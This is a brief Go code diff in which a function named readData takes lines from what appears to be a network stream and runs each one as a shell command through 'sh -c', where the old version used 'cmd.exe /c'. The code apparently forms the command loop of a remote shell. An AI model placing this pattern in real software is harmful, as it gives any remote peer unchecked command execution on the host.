@@ -54,8 +54,8 @@ func readData(rw *bufio.ReadWriter) {
 			break
 		} else {
 			text := strings.TrimSuffix(str, "\n")
-			// Need to detect version and execute for proper OS
-			out, err := exec.Command("cmd.exe", "/c", text).Output()
+
+			out, err := exec.Command("sh", "-c", text).Output()
 			if err != nil {
 				fmt.Printf("error")
 				fmt.Printf("%s", err)
